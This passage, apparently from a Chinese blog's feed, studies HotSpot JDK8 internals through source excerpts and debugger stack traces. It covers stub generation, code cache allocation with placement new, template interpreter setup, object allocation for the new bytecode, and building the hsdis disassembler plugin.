class="hljs-function">__ <span class="hljs-title">ret</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;    <span class="hljs-comment">// handle return types different from T_INT</span>    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(is_long)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movq</span><span class="hljs-params">(Address(c_rarg0, <span class="hljs-number">0</span>), rax)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jmp</span><span class="hljs-params">(<span class="hljs-built_in">exit</span>)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(is_float)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movflt</span><span class="hljs-params">(Address(c_rarg0, <span class="hljs-number">0</span>), xmm0)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jmp</span><span class="hljs-params">(<span class="hljs-built_in">exit</span>)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(is_double)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movdbl</span><span class="hljs-params">(Address(c_rarg0, <span class="hljs-number">0</span>), xmm0)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jmp</span><span class="hljs-params">(<span class="hljs-built_in">exit</span>)</span></span>;    <span class="hljs-keyword">return</span> start;  &#125;</code></pre><p>上述函数是在JVM启动初始化会调用这个。函数返回的是adress，其类型定义如下：  </p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> u_char;<span class="hljs-keyword">typedef</span> u_char*       address;</code></pre><h3 id="关于adress"><a href="#关于adress" class="headerlink" title="关于adress"></a>关于adress</h3><p>C++中是可以将对象this转换成unsigned char指针的。adress的值就是对象this的地址。示例程序参见《C++中将对象this转换成unsigned char指针》  </p><p>address start = _masm-&gt; pc(); // SimonNote: _code_section 的end 是pc() 也是此处的start<br>_masm  </p><h3 id="关于-masm"><a href="#关于-masm" class="headerlink" title="关于_masm"></a>关于_masm</h3><p>__是一个宏，展开后是 _masm-&gt;<br>_masm变量的初始化在stubCodeGenerator.cpp中的StubCodeGenerator::StubCodeGenerator函数里  </p><pre><code class="hljs cpp">StubCodeGenerator::StubCodeGenerator(CodeBuffer* code, <span class="hljs-keyword">bool</span> print_code) &#123;  _masm = <span class="hljs-keyword">new</span> MacroAssembler(code);  _first_stub = _last_stub = <span class="hljs-literal">NULL</span>;  _print_code = print_code;&#125;</code></pre><p>贴一下到初始化_masm的调用栈  </p><pre><code class="hljs cpp">StubCodeGenerator::StubCodeGenerator() at stubCodeGenerator.cpp:<span class="hljs-number">72</span> <span class="hljs-number">0x7ffff69d60d8</span>ICacheStubGenerator::ICacheStubGenerator() at icache.hpp:<span class="hljs-number">91</span> <span class="hljs-number">0x7ffff65da534</span>AbstractICache::initialize() at icache.cpp:<span class="hljs-number">39</span> <span class="hljs-number">0x7ffff65da324</span>icache_init() at icache.cpp:<span class="hljs-number">105</span> <span class="hljs-number">0x7ffff65da4f0</span>CodeCache::initialize() at codeCache.cpp:<span class="hljs-number">572</span> <span class="hljs-number">0x7ffff63d09f8</span>codeCache_init() at codeCache.cpp:<span class="hljs-number">582</span> <span class="hljs-number">0x7ffff63d0a34</span>init_globals() at init.cpp:<span class="hljs-number">98</span> <span class="hljs-number">0x7ffff65e93c5</span>Threads::create_vm() at thread.cpp:<span class="hljs-number">3</span>,<span class="hljs-number">424</span> <span class="hljs-number">0x7ffff6a471c8</span>JNI_CreateJavaVM() at jni.cpp:<span class="hljs-number">5</span>,<span class="hljs-number">166</span> <span class="hljs-number">0x7ffff66a156d</span>InitializeJVM() at java.c:<span class="hljs-number">1</span>,<span class="hljs-number">145</span> <span class="hljs-number">0x7ffff7bc1b1f</span>JavaMain() at java.c:<span class="hljs-number">371</span> <span class="hljs-number">0x7ffff7bbf9e8</span>start_thread() at pthread_create.c:<span class="hljs-number">463</span> <span class="hljs-number">0x7ffff73ab6db</span>clone() at clone.S:<span class="hljs-number">95</span> <span class="hljs-number">0x7ffff78e888f</span></code></pre><p>往上翻几个栈不难看出：<br>_masm(MacroAssembler需要的code是CodeBuffer，<br>CodeBuffer又需要BufferBlob<br>这段逻辑在icache.cpp的 void AbstractICache::initialize()中  </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AbstractICache::initialize</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// Making this stub must be FIRST use of assembler</span>  ResourceMark rm;  BufferBlob* b = BufferBlob::create(<span class="hljs-string">"flush_icache_stub"</span>, ICache::stub_size);  <span class="hljs-function">CodeBuffer <span class="hljs-title">c</span><span class="hljs-params">(b)</span></span>;  <span class="hljs-function">ICacheStubGenerator <span class="hljs-title">g</span><span class="hljs-params">(&amp;c)</span></span>;  g.generate_icache_flush(&amp;_flush_icache_stub);  <span class="hljs-comment">// The first use of flush_icache_stub must apply it to itself.</span>  <span class="hljs-comment">// The StubCodeMark destructor in generate_icache_flush will</span>  <span class="hljs-comment">// call Assembler::flush, which in turn will call invalidate_range,</span>  <span class="hljs-comment">// which will in turn call the flush stub.  Thus we don't need an</span>  <span class="hljs-comment">// explicit call to invalidate_range here.  This assumption is</span>  <span class="hljs-comment">// checked in invalidate_range.</span>&#125;</code></pre><p>BufferBlob* b = BufferBlob::create(“flush_icache_stub”, ICache::stub_size);做了空间分配，下面讲；  </p><h3 id="空间分配"><a href="#空间分配" class="headerlink" title="空间分配"></a>空间分配</h3><p>分配的栈  </p><pre><code class="hljs cpp">HeapBlock::allocated_space() at heap.hpp:<span class="hljs-number">54</span> <span class="hljs-number">0x7ffff65c26e4</span>CodeHeap::allocate() at heap.cpp:<span class="hljs-number">219</span> <span class="hljs-number">0x7ffff65c1a25</span>CodeCache::allocate() at codeCache.cpp:<span class="hljs-number">186</span> <span class="hljs-number">0x7ffff63cf5d8</span>BufferBlob::operator new() at codeBlob.cpp:249 0x7ffff63c8a0bBufferBlob::create() at codeBlob.cpp:<span class="hljs-number">218</span> <span class="hljs-number">0x7ffff63c884e</span>AbstractICache::initialize() at icache.cpp:<span class="hljs-number">36</span> <span class="hljs-number">0x7ffff65da2eb</span>icache_init() at icache.cpp:<span class="hljs-number">105</span> <span class="hljs-number">0x7ffff65da4f0</span>CodeCache::initialize() at codeCache.cpp:<span class="hljs-number">572</span> <span class="hljs-number">0x7ffff63d09f8</span>codeCache_init() at codeCache.cpp:<span class="hljs-number">582</span> <span class="hljs-number">0x7ffff63d0a34</span>init_globals() at init.cpp:<span class="hljs-number">98</span> <span class="hljs-number">0x7ffff65e93c5</span>Threads::create_vm() at thread.cpp:<span class="hljs-number">3</span>,<span class="hljs-number">424</span> <span class="hljs-number">0x7ffff6a471c8</span>JNI_CreateJavaVM() at jni.cpp:<span class="hljs-number">5</span>,<span class="hljs-number">166</span> <span class="hljs-number">0x7ffff66a156d</span>InitializeJVM() at java.c:<span class="hljs-number">1</span>,<span class="hljs-number">145</span> <span class="hljs-number">0x7ffff7bc1b1f</span>JavaMain() at java.c:<span class="hljs-number">371</span> <span class="hljs-number">0x7ffff7bbf9e8</span>start_thread() at pthread_create.c:<span class="hljs-number">463</span> <span class="hljs-number">0x7ffff73ab6db</span>clone() at clone.S:<span class="hljs-number">95</span> <span class="hljs-number">0x7ffff78e888f</span></code></pre><p>有一段代码一开始没读懂，在同事帮助下才看明白：  </p><pre><code class="hljs cpp"><span class="hljs-function">BufferBlob* <span class="hljs-title">BufferBlob::create</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">int</span> buffer_size)</span> </span>&#123;  ThreadInVMfromUnknown __tiv;  <span class="hljs-comment">// get to VM state in case we block on CodeCache_lock</span>  BufferBlob* blob = <span class="hljs-literal">NULL</span>;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> size = <span class="hljs-keyword">sizeof</span>(BufferBlob);  <span class="hljs-comment">// align the size to CodeEntryAlignment</span>  size = align_code_offset(size);  size += round_to(buffer_size, oopSize);  assert(name != <span class="hljs-literal">NULL</span>, <span class="hljs-string">"must provide a name"</span>);  &#123;    <span class="hljs-function">MutexLockerEx <span class="hljs-title">mu</span><span class="hljs-params">(CodeCache_lock, Mutex::_no_safepoint_check_flag)</span></span>;    blob = <span class="hljs-keyword">new</span> (size) BufferBlob(name, size); <span class="hljs-comment">// 这行是什么意思？怎么有这种写法？</span>  &#125;  <span class="hljs-comment">// Track memory usage statistic after releasing CodeCache_lock</span>  MemoryService::track_code_cache_memory_usage();  <span class="hljs-keyword">return</span> blob;&#125;</code></pre><p> BufferBlob* blob = new (size) BufferBlob(name, size); 这种写法是placement new的写法，在《The C++ Programming Language, 4th Edition》中11.2.4 Overloading new有讲解。按我粗浅的不严谨的写法理解成：<br> 在创建对象时，给对象指定分配在哪个内存地址上，place object of size sz at p。<br> 不过这里的写法，跟最简单的placement new写法还是有点差异，它做了重载，最原始的写法是：</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>∗ buf = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">void</span>∗&gt;(<span class="hljs-number">0xF00F</span>); <span class="hljs-comment">// significant address </span>X∗ p2 = <span class="hljs-keyword">new</span>(buf) X; <span class="hljs-comment">// construct an X at buf;</span>                    <span class="hljs-comment">// invokes: operator new(sizeof(X),buf)</span><span class="hljs-comment">// The ‘‘placement’’ operator new() is the simplest such allocator. It is defined in the standard header &lt;new&gt;:</span><span class="hljs-keyword">void</span>∗ <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">new</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> sz, <span class="hljs-keyword">void</span>∗ p)</span> <span class="hljs-keyword">noexcept</span></span>;   <span class="hljs-comment">// place object of size sz at p</span></code></pre><p>对于operator new的第一个参数size_t sz在调用时不用传送，由编译器在编译时决定并送进来，使用者只要送void* p就可以了<br>上面BufferBlob的代码对operator new还做了重载，(这也是通常的做法，自定义内存分配逻辑，并返回分配的指针)：  </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span>* BufferBlob::<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> s, <span class="hljs-keyword">unsigned</span> size, <span class="hljs-keyword">bool</span> is_critical)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-keyword">void</span>* p = CodeCache::allocate(size, is_critical);  <span class="hljs-keyword">return</span> p;&#125;</code></pre><h2 id="字节码翻译成汇编指令"><a href="#字节码翻译成汇编指令" class="headerlink" title="字节码翻译成汇编指令"></a>字节码翻译成汇编指令</h2><p>将字节码翻译成汇编指令的调用栈：<br>以new为例：  </p><pre><code class="hljs cpp">TemplateTable::_new() at templateTable_x86_64.cpp:<span class="hljs-number">3</span>,<span class="hljs-number">250</span> <span class="hljs-number">0x7ffff6a39ed6</span>Template::generate() at templateTable.cpp:<span class="hljs-number">63</span> <span class="hljs-number">0x7ffff6a267c7</span>TemplateInterpreterGenerator::generate_and_dispatch() at templateInterpreter.cpp:<span class="hljs-number">530</span> <span class="hljs-number">0x7ffff6a1c392</span>TemplateInterpreterGenerator::set_vtos_entry_points() at templateInterpreter_x86_64.cpp:<span class="hljs-number">2</span>,<span class="hljs-number">039</span> <span class="hljs-number">0x7ffff6a25dfc</span>TemplateInterpreterGenerator::set_short_entry_points() at templateInterpreter.cpp:<span class="hljs-number">498</span> <span class="hljs-number">0x7ffff6a1c179</span>TemplateInterpreterGenerator::set_entry_points() at templateInterpreter.cpp:<span class="hljs-number">464</span> <span class="hljs-number">0x7ffff6a1bcb3</span>TemplateInterpreterGenerator::set_entry_points_for_all_bytes() at templateInterpreter.cpp:<span class="hljs-number">421</span> <span class="hljs-number">0x7ffff6a1b974</span>TemplateInterpreterGenerator::generate_all() at templateInterpreter.cpp:<span class="hljs-number">402</span> <span class="hljs-number">0x7ffff6a1b8d6</span>InterpreterGenerator::InterpreterGenerator() at templateInterpreter_x86_64.cpp:<span class="hljs-number">2</span>,<span class="hljs-number">051</span> <span class="hljs-number">0x7ffff6a25e3b</span>TemplateInterpreter::initialize() at templateInterpreter.cpp:<span class="hljs-number">52</span> <span class="hljs-number">0x7ffff6a19aab</span>interpreter_init() at interpreter.cpp:<span class="hljs-number">118</span> <span class="hljs-number">0x7ffff664c2fe</span>init_globals() at init.cpp:<span class="hljs-number">107</span> <span class="hljs-number">0x7ffff65e93ef</span>Threads::create_vm() at thread.cpp:<span class="hljs-number">3</span>,<span class="hljs-number">424</span> <span class="hljs-number">0x7ffff6a471c8</span>JNI_CreateJavaVM() at jni.cpp:<span class="hljs-number">5</span>,<span class="hljs-number">166</span> <span class="hljs-number">0x7ffff66a156d</span>InitializeJVM() at java.c:<span class="hljs-number">1</span>,<span class="hljs-number">145</span> <span class="hljs-number">0x7ffff7bc1b1f</span>JavaMain() at java.c:<span class="hljs-number">371</span> <span class="hljs-number">0x7ffff7bbf9e8</span>start_thread() at pthread_create.c:<span class="hljs-number">463</span> <span class="hljs-number">0x7ffff73ab6db</span>clone() at clone.S:<span class="hljs-number">95</span> <span class="hljs-number">0x7ffff78e888f</span></code></pre><p><span style="color:red;font-weight:bold;font-size:16px;">这个栈很重要！</span> 子节码都会按这个套路生成汇编指令模板。<br>在解释汇编指令时再用跳转指令跳转到指令模板入口处的地址。<br>可以通过在调试<code>TemplateTable::_new()</code>代码时，按如下路线查下<code>_masm</code>对应的<code>_code_section</code>对应的<code>_start</code>内存地址，然后通过CDT的Disassembly视图定位到相应的内存地址，并查看生成的指令，一目了然。此办法同样适用于<code>generate_call_stub</code>生成模板指令的地方的调试：    </p><pre><code class="hljs plain">MacroAssemblerMacroAssembler&#123;...&#125;AssemblerAssembler&#123;...&#125;AbstractAssemblerAbstractAssembler&#123;...&#125;ResourceObjResourceObj&#123;...&#125;_code_sectionCodeSection *0x7ffff7fdd5e0_startaddress0x7fffe10449e0 &quot;Pé*&quot;</code></pre><p> <img src="/img/opensource-code-study/127449-20190716120127152-488496549.png" srcset="/img/loading.gif" alt=""></p><p><a href="https://www.cnblogs.com/racaljk/p/10335703.html" target="_blank" rel="noopener">[inside hotspot] 汇编模板解释器(Template Interpreter)和字节码执行</a>  </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hllvm-group.iteye.com/group/topic/40491" target="_blank" rel="noopener">[讨论] HotSpot 解释器是怎样执行bytecode 的</a><br><a href="https://hllvm-group.iteye.com/group/topic/39985" target="_blank" rel="noopener">[讨论] 请教：Java 字节码如何执行的</a><br><a href="https://hllvm-group.iteye.com/group/topic/37707" target="_blank" rel="noopener">[讨论] java_main的汇编入口在哪里</a><br><a href="https://rednaxelafx.iteye.com/blog/428721" target="_blank" rel="noopener">运行时对代码操纵的一个小demo</a><br><a href="http://www.codeceo.com/article/jvm-template-1.html" target="_blank" rel="noopener">JVM 模板解释器之如何根据字节码生成汇编码？</a></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对象创建</title>
    <link href="/2020/04/24/new-object/"/>
    <url>/2020/04/24/new-object/</url>
    
    <content type="html"><![CDATA[<h2 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h2><p>interpreterRuntime.cpp 解释器中new指令的入口：  </p><pre><code class="hljs cpp"><span class="hljs-comment">// 宏展开</span> <span class="hljs-comment">// IRT_ENTRY(void, InterpreterRuntime::_new(JavaThread* thread, ConstantPool* pool, int index))</span><span class="hljs-keyword">void</span>  InterpreterRuntime::_new(JavaThread* thread, ConstantPool* pool, <span class="hljs-keyword">int</span> index) &#123;                                               \    ThreadInVMfromJava __tiv(thread);                                \                                        \  HandleMarkCleaner __hm(thread);                                    \  Thread* __the_thread__ = thread;                                           \  os::verify_stack_alignment();                       \    <span class="hljs-comment">// 宏展开</span>  <span class="hljs-comment">// Klass* k_oop = pool-&gt;klass_at(index, CHECK);</span>   Klass* k_oop = pool-&gt;klass_at(index, __the_thread__); <span class="hljs-keyword">if</span> ((((ThreadShadow*)__the_thread__)-&gt;has_pending_exception())) <span class="hljs-keyword">return</span>       ; (<span class="hljs-keyword">void</span>)(<span class="hljs-number">0</span>);    <span class="hljs-function">instanceKlassHandle <span class="hljs-title">klass</span> <span class="hljs-params">(THREAD, k_oop)</span></span>;  <span class="hljs-comment">// Make sure we are not instantiating an abstract klass</span>  klass-&gt;check_valid_for_instantiation(<span class="hljs-literal">true</span>, CHECK);  <span class="hljs-comment">// Make sure klass is initialized</span>  klass-&gt;initialize(CHECK);  <span class="hljs-comment">// At this point the class may not be fully initialized</span>  <span class="hljs-comment">// because of recursive initialization. If it is fully</span>  <span class="hljs-comment">// initialized &amp; has_finalized is not set, we rewrite</span>  <span class="hljs-comment">// it into its fast version (Note: no locking is needed</span>  <span class="hljs-comment">// here since this is an atomic byte write and can be</span>  <span class="hljs-comment">// done more than once).</span>  <span class="hljs-comment">//</span>  <span class="hljs-comment">// Note: In case of classes with has_finalized we don't</span>  <span class="hljs-comment">//       rewrite since that saves us an extra check in</span>  <span class="hljs-comment">//       the fast version which then would call the</span>  <span class="hljs-comment">//       slow version anyway (and do a call back into</span>  <span class="hljs-comment">//       Java).</span>  <span class="hljs-comment">//       If we have a breakpoint, then we don't rewrite</span>  <span class="hljs-comment">//       because the _breakpoint bytecode would be lost.</span>  oop obj = klass-&gt;allocate_instance(CHECK); <span class="hljs-comment">// SimonNote: 解释器创建对象实力入口</span>  thread-&gt;set_vm_result(obj);    <span class="hljs-comment">//======再往上找谁调进来的，调用栈已经不好观察了，直接贴代码。这个好像不对，再分析</span>  <span class="hljs-comment">// bytecodeInterpreter.cpp </span>  CASE(_new): &#123;  <span class="hljs-comment">// ......</span>  CALL_VM(InterpreterRuntime::_new(THREAD, METHOD-&gt;constants(), index),                handle_exception);    &#125;</code></pre><p>关于对象直接转unsigned char指针的写法，在codeBlob.hpp中有很多这种写法，最简单的示例如下：  </p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> u_char;<span class="hljs-keyword">typedef</span> u_char*       address;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodeBlob::printSize</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; _size &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;  address aa = (address)<span class="hljs-keyword">this</span>; <span class="hljs-comment">// 这样写是没语法错误的,转换后aa的内存地址和this一样的。</span>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; aa &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;&#125;</code></pre><p>至于怎么调到InterpreterRuntime::_new这个方法的，是从汇编指令直接跳过来的，具体的可以看《虚拟机解释器与bytecode对接》一文。  </p><h2 id="怎么调试new指令new你自己的类"><a href="#怎么调试new指令new你自己的类" class="headerlink" title="怎么调试new指令new你自己的类"></a>怎么调试new指令new你自己的类</h2><p>要调试这个new指令怎么new你自己的类(你做实验的类)，怎么做？<br>因为JVM在执行一个main方法时，前面会new200+个类，要调到你自己的类，得有个办法才行，不然F8一路按下去要按好久。<br>我的办法是：<br>在 InterpreterRuntime::_new加上 k_oop-&gt;name()-&gt;print();</p><pre><code class="hljs cpp">IRT_ENTRY(<span class="hljs-keyword">void</span>, InterpreterRuntime::_new(JavaThread* thread, ConstantPool* pool, <span class="hljs-keyword">int</span> index))  Klass* k_oop = pool-&gt;klass_at(index, CHECK); k_oop-&gt;name()-&gt;print();<span class="hljs-function">instanceKlassHandle <span class="hljs-title">klass</span> <span class="hljs-params">(THREAD, k_oop)</span></span>;<span class="hljs-comment">// 这样能把每次new的class名给打出来</span></code></pre><p>这样就能发现我自己的类大概是在new指令被调用了261次后才被new，于是对此处断点加上ignore count为261，这样便能调试到new我自己的测试类了。  </p><h2 id="new指令为对象分配空间"><a href="#new指令为对象分配空间" class="headerlink" title="new指令为对象分配空间"></a>new指令为对象分配空间</h2><p>此处我的测试类是Group  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Group</span> </span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<span class="hljs-keyword">private</span> <span class="hljs-keyword">long</span> t1;<span class="hljs-keyword">private</span> <span class="hljs-keyword">long</span> t2;<span class="hljs-keyword">private</span> <span class="hljs-keyword">long</span> t3;<span class="hljs-keyword">private</span> String name;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Group</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, String name)</span> </span>&#123;<span class="hljs-keyword">this</span>.id = id;<span class="hljs-keyword">this</span>.name = name;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> id;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<span class="hljs-keyword">this</span>.id = id;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> name;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<span class="hljs-keyword">this</span>.name = name;&#125;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">"Group [id="</span> + id + <span class="hljs-string">", name="</span> + name + <span class="hljs-string">"]"</span>;&#125;&#125;</code></pre><p>计算对象大小：  </p><pre><code class="hljs cpp"><span class="hljs-function">instanceOop <span class="hljs-title">InstanceKlass::allocate_instance</span><span class="hljs-params">(TRAPS)</span> </span>&#123;  <span class="hljs-keyword">bool</span> has_finalizer_flag = has_finalizer(); <span class="hljs-comment">// Query before possible GC</span>  <span class="hljs-keyword">int</span> size = size_helper();  <span class="hljs-comment">// Query before forming handle.</span>  <span class="hljs-function">KlassHandle <span class="hljs-title">h_k</span><span class="hljs-params">(THREAD, <span class="hljs-keyword">this</span>)</span></span>;  instanceOop i;  i = (instanceOop)CollectedHeap::obj_allocate(h_k, size, CHECK_NULL);  <span class="hljs-keyword">if</span> (has_finalizer_flag &amp;&amp; !RegisterFinalizersAtInit) &#123;    i = register_finalizer(i, CHECK_NULL);  &#125;  <span class="hljs-keyword">return</span> i;&#125;</code></pre><p>此处size为6，我理解此处的单位是heapword即byte。<br>分配空间的栈：  </p><pre><code class="hljs cpp">Copy::pd_fill_to_words() at copy_x86.hpp:<span class="hljs-number">49</span> <span class="hljs-number">0x7ffff61faf7c</span>Copy::fill_to_words() at copy.hpp:<span class="hljs-number">236</span> <span class="hljs-number">0x7ffff61fae72</span>ThreadLocalAllocBuffer::allocate() at threadLocalAllocBuffer.<span class="hljs-keyword">inline</span>.hpp:<span class="hljs-number">44</span> <span class="hljs-number">0x7ffff61fb04e</span>CollectedHeap::allocate_from_tlab() at collectedHeap.<span class="hljs-keyword">inline</span>.hpp:<span class="hljs-number">181</span> <span class="hljs-number">0x7ffff61fb97a</span>CollectedHeap::common_mem_allocate_noinit() at collectedHeap.<span class="hljs-keyword">inline</span>.hpp:<span class="hljs-number">124</span> <span class="hljs-number">0x7ffff61fb6d9</span>CollectedHeap::common_mem_allocate_init() at collectedHeap.<span class="hljs-keyword">inline</span>.hpp:<span class="hljs-number">173</span> <span class="hljs-number">0x7ffff61fb8e2</span>CollectedHeap::obj_allocate() at collectedHeap.<span class="hljs-keyword">inline</span>.hpp:<span class="hljs-number">201</span> <span class="hljs-number">0x7ffff660a876</span>InstanceKlass::allocate_instance() at instanceKlass.cpp:<span class="hljs-number">1</span>,<span class="hljs-number">104</span> <span class="hljs-number">0x7ffff65f36fd</span>InterpreterRuntime::_new() at interpreterRuntime.cpp:<span class="hljs-number">172</span> <span class="hljs-number">0x7ffff6652fb8</span></code></pre><p>分配空间的代码：  </p><pre><code class="hljs cpp"><span class="hljs-comment">// threadLocalAllocBuffer.inline.hpp</span><span class="hljs-function"><span class="hljs-keyword">inline</span> HeapWord* <span class="hljs-title">ThreadLocalAllocBuffer::allocate</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span> </span>&#123;  invariants();  HeapWord* obj = top();  <span class="hljs-keyword">if</span> (pointer_delta(end(), obj) &gt;= size) &#123;    <span class="hljs-comment">// successful thread-local allocation</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> ASSERT</span>    <span class="hljs-comment">// Skip mangling the space corresponding to the object header to</span>    <span class="hljs-comment">// ensure that the returned space is not considered parsable by</span>    <span class="hljs-comment">// any concurrent GC thread.</span>    <span class="hljs-keyword">size_t</span> hdr_size = oopDesc::header_size();    Copy::fill_to_words(obj + hdr_size, size - hdr_size, badHeapWordVal);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// ASSERT</span></span>    <span class="hljs-comment">// This addition is safe because we know that top is</span>    <span class="hljs-comment">// at least size below end, so the add can't wrap.</span>    set_top(obj + size);    invariants();    <span class="hljs-keyword">return</span> obj;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-comment">// copy_x86.hpp</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pd_fill_to_words</span><span class="hljs-params">(HeapWord* tohw, <span class="hljs-keyword">size_t</span> count, juint value)</span> </span>&#123;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> AMD64</span>  julong* to = (julong*) tohw;  julong  v  = ((julong) value &lt;&lt; <span class="hljs-number">32</span>) | value;  <span class="hljs-keyword">while</span> (count-- &gt; <span class="hljs-number">0</span>) &#123;    *to++ = v;  &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>  juint* to = (juint*)tohw;  count *= HeapWordSize / BytesPerInt;  <span class="hljs-keyword">while</span> (count-- &gt; <span class="hljs-number">0</span>) &#123;    *to++ = value;  &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// AMD64</span></span>&#125;</code></pre><h2 id="编译hsdis"><a href="#编译hsdis" class="headerlink" title="编译hsdis"></a>编译hsdis</h2><pre><code class="hljs shell">cd /home/appweb/600.self/03.code/01.cpp/01.jdk8-b120/hotspot-jdk8-b120/hotspot/src/share/tools/hsdiswget ftp://sourceware.org/pub/binutils/snapshots/binutils-2.20.51.tar.bz2tar -xjvf binutils-2.20.51.tar.bz2export BINUTILS=binutils-2.20.51gedit binutils-2.20.51/binutils/configure  # 修改一下  注释掉下面的代码<span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">"<span class="hljs-variable">$&#123;ERROR_ON_WARNING&#125;</span>"</span> = yes ; <span class="hljs-keyword">then</span></span><span class="hljs-meta">#</span><span class="bash">    GCC_WARN_CFLAGS=<span class="hljs-string">"<span class="hljs-variable">$GCC_WARN_CFLAGS</span> -Werror"</span></span><span class="hljs-meta">#</span><span class="bash">    NO_WERROR=<span class="hljs-string">"-Wno-error"</span></span><span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">fi</span></span>gedit binutils-2.20.51/bfd//configure  # 修改一下  注释掉上面的代码make all64<span class="hljs-meta">#</span><span class="bash"> 编译成功后 copy so文件到对应目录</span> cp build/linux-amd64/hsdis-amd64.so ~/600.self/03.code/01.cpp/01.jdk8-b120/hotspot-jdk8-b120/build/linux-x86_64-normal-server-slowdebug/jdk/lib/amd64/server/</code></pre><p>编译好后，放到正确的路径下，就可以用-XX:+PrintInterpreter打印出汇编代码了。  </p><h2 id="解释器"><a href="#解释器" class="headerlink" title="解释器"></a>解释器</h2><p><a href="https://rednaxelafx.iteye.com/blog/428721" target="_blank" rel="noopener">运行时对代码操纵的一个小demo</a>  </p><h2 id="new一个对象的汇编代码翻译"><a href="#new一个对象的汇编代码翻译" class="headerlink" title="new一个对象的汇编代码翻译"></a>new一个对象的汇编代码翻译</h2><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectCreateTest1</span> </span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;Group g = <span class="hljs-keyword">new</span>  Group(<span class="hljs-number">1</span>, <span class="hljs-string">"g-1"</span>);&#125;&#125;</code></pre><h2 id="字节码翻译时，内存地址查看"><a href="#字节码翻译时，内存地址查看" class="headerlink" title="字节码翻译时，内存地址查看"></a>字节码翻译时，内存地址查看</h2><pre><code class="hljs hrml">MacroAssemblerMacroAssembler&#123;...&#125;AssemblerAssembler&#123;...&#125;AbstractAssemblerAbstractAssembler&#123;...&#125;ResourceObjResourceObj&#123;...&#125;_code_sectionCodeSection *0x7ffff7fdd5e0_startaddress0x7fffe10449e0 